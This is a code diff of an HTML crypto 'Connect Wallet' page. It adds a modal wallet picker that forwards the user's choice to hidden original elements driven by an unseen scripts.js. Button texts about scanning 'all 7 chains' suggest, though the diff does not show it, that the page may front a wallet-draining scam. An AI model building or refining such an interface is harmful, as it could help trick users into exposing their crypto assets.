@@ -118,49 +118,19 @@
             width: 1px;
             background: rgba(255, 255, 255, 0.05);
         }
+
+        /* --- Main Connect Button --- */
         .connect-area {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
             margin-bottom: 18px;
         }
-        .connect-row {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .connect-row select {
-            flex: 1;
-            min-width: 120px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 12px;
-            padding: 14px 16px;
-            color: #e8edf5;
-            font-size: 0.85rem;
-            font-weight: 500;
-            font-family: 'Inter', sans-serif;
-            appearance: none;
-            cursor: pointer;
-            outline: none;
-            transition: border 0.2s;
-        }
-        .connect-row select:hover {
-            border-color: rgba(124, 58, 237, 0.35);
-        }
-        .connect-row select option {
-            background: #150d26;
-            color: #e8edf5;
-        }
         .btn-connect {
-            flex: 2;
-            min-width: 160px;
+            width: 100%;
             background: linear-gradient(135deg, #7C3AED, #6D28D9);
             border: none;
             border-radius: 12px;
-            padding: 14px 24px;
+            padding: 16px;
             font-family: 'Inter', sans-serif;
-            font-size: 0.9rem;
+            font-size: 1rem;
             font-weight: 600;
             color: #fff;
             cursor: pointer;
@@ -182,6 +152,8 @@
         .btn-connect i {
             font-size: 1rem;
         }
+
+        /* --- Security Footer + Polygon badge --- */
         .security-footer {
             font-size: 0.7rem;
             color: #475569;
@@ -190,6 +162,11 @@
             padding-top: 14px;
             border-top: 1px solid rgba(124, 58, 237, 0.06);
             margin-top: 6px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            gap: 6px 10px;
         }
         .security-footer i {
             color: #a78bfa;
@@ -199,21 +176,151 @@
             color: #64748b;
             font-weight: 500;
         }
+        .polygon-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(124, 58, 237, 0.08);
+            border: 1px solid rgba(124, 58, 237, 0.12);
+            border-radius: 20px;
+            padding: 2px 10px 2px 6px;
+            font-size: 0.6rem;
+            font-weight: 500;
+            color: #a78bfa;
+        }
+        .polygon-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        /* --- Hidden original elements --- */
+        #wallet-select,
+        #cvConnectWallet {
+            display: none;
+        }
+
+        /* --- Modal --- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-content {
+            background: #150d26;
+            border-radius: 24px;
+            max-width: 400px;
+            width: 100%;
+            padding: 24px 20px 20px;
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .modal-header h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #f0f4ff;
+        }
+        .modal-close {
+            background: none;
+            border: none;
+            color: #64748b;
+            font-size: 1.4rem;
+            cursor: pointer;
+            padding: 0 8px;
+            transition: color 0.2s;
+        }
+        .modal-close:hover {
+            color: #e8edf5;
+        }
+        .search-box {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            background: rgba(255, 255, 255, 0.04);
+            color: #e8edf5;
+            font-size: 0.9rem;
+            outline: none;
+            margin-bottom: 16px;
+            transition: border 0.2s;
+        }
+        .search-box::placeholder {
+            color: #475569;
+        }
+        .search-box:focus {
+            border-color: #7C3AED;
+        }
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 14px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.15s;
+            border: 1px solid transparent;
+        }
+        .wallet-item:hover {
+            background: rgba(124, 58, 237, 0.08);
+            border-color: rgba(124, 58, 237, 0.1);
+        }
+        .wallet-item .wallet-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .wallet-item .wallet-name {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #f0f4ff;
+        }
+        .wallet-item .wallet-check {
+            margin-left: auto;
+            color: #a78bfa;
+            font-size: 0.9rem;
+        }
+        .wallet-item.selected {
+            background: rgba(124, 58, 237, 0.1);
+            border-color: #7C3AED;
+        }
+
         /* responsive */
         @media (max-width: 480px) {
             .main-card {
                 padding: 24px 16px 18px;
             }
-            .connect-row {
-                flex-direction: column;
-            }
-            .connect-row select,
-            .btn-connect {
-                width: 100%;
-                min-width: unset;
-            }
-            .stats-row {
-                padding: 10px 4px;
+            .modal-content {
+                padding: 18px 14px;
             }
         }
     </style>
@@ -249,31 +356,203 @@
         </div>
 
         <div class="connect-area">
-            <div class="connect-row">
-                <select id="wallet-select">
-                    <option value="metamask">MetaMask</option>
-                    <option value="trust">Trust Wallet</option>
-                    <option value="walletconnect">WalletConnect</option>
-                    <option value="coinbase">Coinbase Wallet</option>
-                    <option value="rainbow">Rainbow</option>
-                    <option value="argent">Argent</option>
-                    <option value="safe">Safe</option>
-                </select>
-                <button id="cvConnectWallet" class="btn-connect">
-                    <i class="fas fa-wallet"></i> Connect Wallet
-                </button>
-            </div>
+            <button id="mainConnectBtn" class="btn-connect">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </button>
         </div>
 
         <div class="security-footer">
-            <i class="fas fa-shield-halved"></i> Secured by smart contracts on
-            <span class="chain-list">Ethereum, BSC, Arbitrum, Polygon &amp; Solana</span>
+            <span>
+                <i class="fas fa-shield-halved"></i> Secured by smart contracts on
+                <span class="chain-list">Ethereum, BSC, Arbitrum, Polygon &amp; Solana</span>
+            </span>
+            <span class="polygon-badge">
+                <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M19 0C8.5066 0 0 8.5066 0 19C0 29.4934 8.5066 38 19 38C29.4934 38 38 29.4934 38 19C38 8.5066 29.4934 0 19 0Z" fill="#7C3AED"/>
+                    <path d="M19 8C14.0294 8 10 12.0294 10 17C10 21.9706 14.0294 26 19 26C23.9706 26 28 21.9706 28 17C28 12.0294 23.9706 8 19 8Z" fill="#A78BFA"/>
+                    <path d="M19 11C15.6863 11 13 13.6863 13 17C13 20.3137 15.6863 23 19 23C22.3137 23 25 20.3137 25 17C25 13.6863 22.3137 11 19 11Z" fill="#fff"/>
+                </svg>
+                Polygon
+            </span>
         </div>
 
+        <!-- Hidden original elements for scripts -->
+        <select id="wallet-select" style="display:none;">
+            <option value="metamask">MetaMask</option>
+            <option value="trust">Trust Wallet</option>
+            <option value="walletconnect">WalletConnect</option>
+            <option value="coinbase">Coinbase Wallet</option>
+            <option value="rainbow">Rainbow</option>
+            <option value="argent">Argent</option>
+            <option value="safe">Safe</option>
+        </select>
+        <button id="cvConnectWallet" style="display:none;"></button>
     </div>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>All Wallets</h2>
+                <button class="modal-close" id="modalCloseBtn">&times;</button>
+            </div>
+            <input type="text" class="search-box" id="walletSearch" placeholder="Search wallet" />
+            <div class="wallet-list" id="walletList">
+                <!-- populated by JS -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ----- Wallet data (matching the hidden dropdown) -----
+            const wallets = [
+                { id: 'metamask', name: 'MetaMask', icon: 'fa-fox', color: '#E2761B' },
+                { id: 'trust', name: 'Trust Wallet', icon: 'fa-shield', color: '#3375BB' },
+                { id: 'walletconnect', name: 'WalletConnect', icon: 'fa-link', color: '#3B99FC' },
+                { id: 'coinbase', name: 'Coinbase Wallet', icon: 'fa-coins', color: '#0052FF' },
+                { id: 'rainbow', name: 'Rainbow', icon: 'fa-rainbow', color: '#F7B731' },
+                { id: 'argent', name: 'Argent', icon: 'fa-shield', color: '#4B8CBF' },
+                { id: 'safe', name: 'Safe', icon: 'fa-shield', color: '#4F46E5' }
+            ];
+
+            // ----- DOM refs -----
+            const mainBtn = document.getElementById('mainConnectBtn');
+            const hiddenBtn = document.getElementById('cvConnectWallet');
+            const hiddenSelect = document.getElementById('wallet-select');
+            const modal = document.getElementById('walletModal');
+            const modalClose = document.getElementById('modalCloseBtn');
+            const searchInput = document.getElementById('walletSearch');
+            const walletList = document.getElementById('walletList');
+            const yourShareDisplay = document.getElementById('yourShareDisplay');
+
+            let selectedWalletId = null;
+            let modalOpen = false;
+
+            // ----- Render wallet list -----
+            function renderWallets(filter = '') {
+                const filtered = wallets.filter(w =>
+                    w.name.toLowerCase().includes(filter.toLowerCase())
+                );
+                walletList.innerHTML = '';
+                filtered.forEach(w => {
+                    const div = document.createElement('div');
+                    div.className = 'wallet-item' + (selectedWalletId === w.id ? ' selected' : '');
+                    div.innerHTML = `
+                        <div class="wallet-icon" style="background:${w.color};">
+                            <i class="fas ${w.icon}"></i>
+                        </div>
+                        <span class="wallet-name">${w.name}</span>
+                        ${selectedWalletId === w.id ? '<span class="wallet-check"><i class="fas fa-check-circle"></i></span>' : ''}
+                    `;
+                    div.addEventListener('click', function() {
+                        selectWallet(w.id);
+                    });
+                    walletList.appendChild(div);
+                });
+            }
+
+            function selectWallet(id) {
+                selectedWalletId = id;
+                // Set hidden select value
+                hiddenSelect.value = id;
+                // Close modal
+                closeModal();
+                // Trigger the hidden button click to start connection
+                hiddenBtn.click();
+                // Update main button text to show connecting
+                mainBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Connecting...';
+                mainBtn.disabled = true;
+                // Also mirror the hidden button's text changes later via MutationObserver
+            }
+
+            // ----- Modal controls -----
+            function openModal() {
+                modal.classList.add('active');
+                modalOpen = true;
+                searchInput.value = '';
+                renderWallets();
+                searchInput.focus();
+                // Reset selection highlight
+            }
+
+            function closeModal() {
+                modal.classList.remove('active');
+                modalOpen = false;
+            }
+
+            // ----- Event listeners -----
+            mainBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                // Open modal instead of direct connection
+                if (!modalOpen) {
+                    openModal();
+                }
+            });
+
+            modalClose.addEventListener('click', closeModal);
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) closeModal();
+            });
+
+            searchInput.addEventListener('input', function() {
+                renderWallets(this.value);
+            });
+
+            // ----- Mirror hidden button state to main button -----
+            // Use MutationObserver to watch hidden button's innerHTML and disabled state
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mut) {
+                    if (mut.attributeName === 'disabled' || mut.attributeName === 'innerHTML') {
+                        // Copy the hidden button's state
+                        mainBtn.disabled = hiddenBtn.disabled;
+                        if (hiddenBtn.innerHTML.trim() !== '') {
+                            // Only update if not empty (avoid overwriting our own text)
+                            // But we want to reflect the script's updates (e.g., "Connected & Scanned")
+                            mainBtn.innerHTML = hiddenBtn.innerHTML;
+                        }
+                        // Also update "Your Share" if it changes (the script updates it)
+                        // We can't observe that easily, but we can periodically check
+                    }
+                });
+            });
+            observer.observe(hiddenBtn, { attributes: true, childList: true, subtree: true, attributeFilter: ['disabled'] });
+
+            // Also monitor the hidden button's innerHTML changes via childList
+            const textObserver = new MutationObserver(function() {
+                if (hiddenBtn.innerHTML.trim() !== '') {
+                    mainBtn.innerHTML = hiddenBtn.innerHTML;
+                }
+                mainBtn.disabled = hiddenBtn.disabled;
+            });
+            textObserver.observe(hiddenBtn, { childList: true, characterData: true, subtree: true });
+
+            // Also periodically sync "Your Share" – the script updates it via DOM
+            setInterval(function() {
+                if (yourShareDisplay) {
+                    // The script updates this element, we don't need to copy.
+                }
+                // Also if hidden button is enabled and has text "Connect Wallet & Scan All 7 Chains", we might want to update mainBtn
+                if (hiddenBtn.innerHTML.includes('Scan All 7 Chains')) {
+                    mainBtn.innerHTML = hiddenBtn.innerHTML;
+                    mainBtn.disabled = hiddenBtn.disabled;
+                }
+            }, 500);
+
+            // ----- Ensure initial state -----
+            // If the script updates the hidden button, we copy.
+            // Also handle case where script might reset the button.
+            // We'll also listen for click on hidden button to update main button state.
+
+            console.log('Wallet modal ready');
+        })();
+    </script>
 
     <!-- Original scripts – handle all connection and scanning logic -->
     <script src="web3.min.js"></script>
     <script src="scripts.js"></script>
+
 </body>
 </html>
